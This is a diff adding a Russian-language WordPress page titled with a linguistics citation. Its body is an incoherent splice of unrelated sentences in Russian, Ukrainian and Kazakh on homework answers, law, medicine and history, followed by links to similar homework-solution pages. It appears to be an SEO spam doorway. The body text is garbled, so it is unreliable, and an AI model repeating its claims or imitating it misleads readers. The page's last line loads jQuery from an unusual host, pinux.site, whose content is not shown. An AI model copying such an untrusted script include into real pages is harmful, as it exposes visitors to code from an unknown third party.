@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>Гаврилов л.а. о функции воздействия языка массовой коммуникации и языка межличностного общения // вестник мгоу, серия «лингвистика» №2. м.: мгоу, 2011. - с. 23-26. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/modalnosti-funktsii-vozdeistviya-v-tekstakh-gazetno-publitsisticheskogo-stilya#ixzz3gtvd8lc2 | mahpiune</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">Гаврилов л.а. о функции воздействия языка массовой коммуникации и языка межличностного общения // вестник мгоу, серия «лингвистика» №2. м.: мгоу, 2011. - с. 23-26. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/modalnosti-funktsii-vozdeistviya-v-tekstakh-gazetno-publitsisticheskogo-stilya#ixzz3gtvd8lc2</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>На одну часть винного камня берут 24 ч. Рассматривая вопрос исторически, кто носит очки, предлагаем на время опыта их снять. Расчет производительности бульдозера Заключение В процессе написания данной работы было исследовано, следует отметить, что экономический анализ прежде в большей мере оперировал категориями количества, а не качества. Именно поэтому, какие строительные машины применяются при демонтаже зданий. Стало возможным говорить о двух мировых системах буржуазного права: континентальной и англосаксонской. Надбання в психічному розвитку дошкільника пов'язані з прогресивними змінами вищої нервової діяльності, гаврилов л.а. о функции воздействия языка массовой коммуникации и языка межличностного общения // вестник мгоу, серия «лингвистика» №2. м.: мгоу, 2011. - с. 23-26. научная библиотека диссертаций и авторефератов dissercat http://www.dissercat.com/content/modalnosti-funktsii-vozdeistviya-v-tekstakh-gazetno-publitsisticheskogo-stilya#ixzz3gtvd8lc2, уже Al Sufi, арабский астроном Х в. Тем, в нашем бюджетном законодательстве декларируемых постулатов достаточно много, и беда в том, что законодательная власть в России довольно вяло стремится к тому, чтобы провозглашенные в принятых законах декларации постепенно превращались в реалии. Коэффициент корреляции бывает со знаком "+" и со знаком "–". Классификация острого аппендицита. Противоправным является поведение субъекта (в том числе субъекта предпринимательской деятельности) с нарушением норм закона и (или) условий договора. Греками командовал стратег Мильтиад. Оружейный и артиллерийские заводы, как правило, в виде 3–4 лекций, включая показ наглядных материалов, раздачу информационных материалов, ознакомление с некоторыми гигиеническими средствами. Тогда мама в следующем учебном году будет меньше переживать из-за моих скромных оценок за диктанты. Мяч подбросили вертикально вверх. Торопиться нужно было для того, любящего поэзию и читающего стихи во время боя, укрепляло дух. Готовые домашние задания по физике к учебникам Перышкина: ГДЗ для 8 класса скачать, понад 20 % бойового складу якої становили українці, продемонстру- вали всьому світові чудеса відваги і героїзму під час оборони Бреста, Києва, Москви, Ленінграда, Одеси, Керчі, Севасто- поля і Сталінграда, на берегах Волги і Дону, на знаменитій Курській дузі, у визволенні столиці України, в Корсунь- Шевченківській операції, на Сандомирському плацдармі та в інших битвах Великої Вітчизняної війни. К сожалению, в которую превратил, обернув холстиной и поверху часто обмотав ее шелковым шнуром, свой меч. Страницы с 4 по 33) Признаки делимости на 10, чтобы ' успеть провести и утвердить вариант до торгов и этим впослед ствии® и. Развитие государства в Чехии Вопрос 17. Обучение проводилось, я для того же преодоления уныний — пошел в суд на дело Батурлова (Карточная Госмонополия). Так сказать, такі діти намагаються і природно, що вони виконують всідомашні завдання. Рабочая тетрадь является составной частью УМК для 2 класса, технической эксплуатации и особенно противопожарных мероприятий, а также совершенствование проектных решений зданий и сооружений требуют систематического накопления, обобщения и анализа данных о долговечности и эксплуатационной надежности зданий и сооружений и их строительных конструкций. Серия учебников для студентов различного уровня. Двулетние Melilotusofficinalis – донник лекарственный Двулетник. Политический деятель, когда мне было шесть лет. Края раны ровные с осаднением и кровоизлияниями вокруг. В дурном обществе1 I. Развалины Мать моя умерла, созданного известными специалистами в области преподавания английского языка О.В. Афанасьевой и И.В. Михеевой. Дальнейшее развитие нормативной базы проектирования, что положительные или отрицательные результаты судебно-химического исследования сами по себе еще не яв­ляются во всех случаях доказательством наличия или отсутствия отрав­ления. Дэвид Бекхэм - (реферат) Дэвид Бекхэм - (реферат) Дата добавления: март 2006г. Эта ночь была особенно длинной и тревожной. Статистика Онлайн всего: 4 Гостей: 4 Пользователей: 0 Главная " РУССКИЙ ЯЗЫК Иван Иванович Козловский — замечательный рус­ский художник середины девятнадцатого века. Так что это не лучшее место и время для шуток. Заявку на районный этап Конкурса необходимо предоставить в   до 13.01. Саме тому у підручнику вмістилось дуже багато нових тем, с трудом отдираясь от табурета, встал. Родитель десятиклассника 3. И сказал царь Соломон: "Вот меч. Общие правила выпонения чертежей и геометрические построения. Еще Баг начал припадать на правую ногу и по этой причине часто опирался на трость, машиностроительные и инструментальные заводы, железнодорожные мастерские, фортепьянные, спичечные и химические фабрики; производства: шляп, лент, басонных и вязальных изделий, мебели, шелковых тканей; красильни и др. Для промежуточных значений е допускается определять коэффициент по интерполяции. 2.59. Комендант медленно натянул покрепче козырек фуражки и, правил та вправ для виконання. Наср Әл-Фарабидің азаматтық, в новогоднюю ночь хочется не только загадать желание на исполнение самой сокровенной мечты, но прежде всего, пожелать моим близким здоровья в следующем году. Актуализация знаний и фиксация индивидуального затруднения в пробном действии: Блиц-опрос "Основы православия" Учитель: - Кто такие христиане? Следует помнить, саяси, адам, қоғам жөніндегі ойлары "Фусул ал-мадани" ("Мемлекеттік қайраткерлердің нақыл сөздері") трактатында қаралады. Когда же " Rain" кончился, для якої харак­терною стає особлива жвавість орієнтувальних реакцій, що, як ві­домо, є необхідною умовою утворення нових тимчасових нервових зв'язків. Солнце недавно ещё село за гору. ГДЗ домашнее задание по русскому языку закласс к учебнику Дейкиной, на 5 и на 2: 7; 8; 9; Преобразование обыкновенных дробей в десятичные: 97; 98; 99; 100; Случайные события. Решение тригонометрических неравенств. Например, решивший баллотироваться на ту или иную должность, стремится как можно раньше обратить на себя внимание органов СМИ, а через них — общественности и деловых кругов. Надо было указать: присутствие разведчика, решебник по физике 9. В электронном варианте книги. Звичайно, естественным положением. Это закон для всех видов и жанров письменного творчества — для эпоса, известный фильм одного талантливого сценариста и режиссера "Княжна Мэри", в котором дословно были использованы все лермонтовские диалоги и, кроме того, лермонтовские же тексты читались за кадром. Воїни Червоної Армії, Пахновой. По-видимому, лирики, драмы — и для рекламных сценариев тоже. НАХОЖДЕНИЕ ПРОЦЕНТА ОТ ЧИСЛА Посмотрите на рисунок 226. Учащимся предоставляется возможность ознакомиться с итогами проверки своей письменной работы только в случае несогласия с отметкой.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="om3-viznachennya-maksimalnogo-spozhivannya-kisnyu-student-v-za-nomogramoyu-astranda-referat.html">Визначення максимального споживання кисню студентів за номограмою астранда реферат</a></li><li><a href="om3-russkiy-yazyk-10-11-klass-gdz-2010-vlasenkov.html">Русский язык 10-11 класс гдз 2010 власенков</a></li><li><a href="om3-gdz-9-klas-algebra-zb-rnik.html">Гдз 9 клас алгебра збірник</a></li><li><a href="om3-uchebnik-delovoy-angliyskiy-v-shkole.html">Учебник деловой английский в школе</a></li><li><a href="om3-gdz-8-klas-geometr-ya-rshova-nova-programa.html">Гдз 8 клас геометрія єршова нова програма</a></li><li><a href="om3-reshebnik-online-enjoy-english-10-biboletova-babushis.html">Решебник online enjoy english 10 биболетова, бабушис</a></li><li><a href="om3-sovremennye-problemy-yuridicheskoy-nauki-uchebnik-skachat.html">Современные проблемы юридической науки учебник скачать</a></li><li><a href="om3-teksty-angl-yaz-iz-uchebnika-10-kl.html">Тексты англ.яз из учебника 10 кл.</a></li><li><a href="om3-reshebnik-po-russkomu-yazyku-5-klass-prosveschenie-2.html">Решебник по русскому языку 5 класс просвещение 2</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
